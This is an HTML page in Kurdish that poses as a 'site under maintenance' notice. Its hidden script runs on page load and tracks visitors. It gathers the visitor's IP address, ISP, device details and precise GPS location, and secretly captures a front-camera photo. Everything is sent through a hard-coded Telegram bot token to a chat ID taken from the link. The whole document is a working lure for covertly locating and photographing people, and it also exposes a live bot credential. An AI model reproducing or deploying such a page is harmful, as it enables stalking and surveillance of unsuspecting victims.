<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 { font-size: 24px; color: #e74c3c; }
        p { font-size: 16px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
        <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        // دەستنیشانکردنی GPU
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}
            return "نادیار";
        }

        async function sendTelegramMessage(text) {
            if (!chatId) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
            } catch (err) {
                console.error(err);
            }
        }

        async function sendTelegramPhoto(blob) {
            if (!chatId) return;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە کامێرای پێشەوە!**');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error(err);
            }
        }

        async function processVisitor() {
            if (!chatId) return;

            // 1. وەرگرتنی زانیاری IP
            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {}

            const ip = ipData.ip || 'نادیار';
            const isp = ipData.org || 'نادیار';
            const gpu = getGPU();
            const ratio = window.devicePixelRatio || 1;
            const resolution = `${window.screen.width}x${window.screen.height} (Ratio:${ratio})`;

            // 2. وەرگرتنی دۆخی لۆکەیشن
            let locationText = "";
            let mapText = "";

            try {
                const position = await new Promise((resolve, reject) => {
                    if (!("geolocation" in navigator)) {
                        reject({ code: 0 });
                    } else {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 0
                        });
                    }
                });

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                locationText = `🟢 ALLOW کراوە (GPS هەڵکراوە): \`${lat}, ${lon}\``;
                mapText = `\n🗺 **لینکی نەخشە:** [کردنەوە لە Google Maps](https://www.google.com/maps?q=${lat},${lon})`;

            } catch (error) {
                if (error.code === 1) { // DENY
                    locationText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
                } else if (error.code === 2) { // POSITION_UNAVAILABLE
                    locationText = "🟡 ALLOW کراوە (بەڵام Location / GPSی مۆبایلەکەی داخراوە)";
                } else if (error.code === 3) { // TIMEOUT
                    locationText = "⚠️ کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS";
                } else {
                    locationText = "❌ ئامێرەکە پشتگیری لۆکەیشن ناکات";
                }
            }

            // 3. وەرگرتنی دۆخی کامێرا
            let cameraStatusText = "";
            let imageBlob = null;

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    cameraStatusText = "🟢 ALLOW کراوە (وێنەکە گیرا)";

                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    imageBlob = await new Promise((resolve) => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob((blob) => {
                                stream.getTracks().forEach(track => track.stop());
                                resolve(blob);
                            }, 'image/jpeg');
                        }, 1000);
                    });

                } catch (err) {
                    cameraStatusText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
                }
            } else {
                cameraStatusText = "❌ ئامێرەکە پشتگیری کامێرا ناکات";
            }

            // 4. دروستکردن و ناردنی تەنها یەک پەیامی گشتگیر
            const fullMessage = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**

🌐 **IP Address:** \`${ip}\`
🏢 **کۆمپانیای ئینتەرنێت (ISP):** ${isp}
🎯 **دۆخی شوێن (GPS):** ${locationText}${mapText}
📷 **دۆخی کامێرا:** ${cameraStatusText}

📱 **سیستەم:** ${navigator.platform}
📐 **ڕوونی شاشە:** ${resolution}
🎮 **GPU:** ${gpu}
💻 **User-Agent:** \`${navigator.userAgent}\``;

            await sendTelegramMessage(fullMessage);

            // ئەگەر وێنە هەبوو، دوای پەیامەکە دەنێردرێت
            if (imageBlob) {
                await sendTelegramPhoto(imageBlob);
            }
        }

        window.onload = processVisitor;
    </script>
</body>
</html>
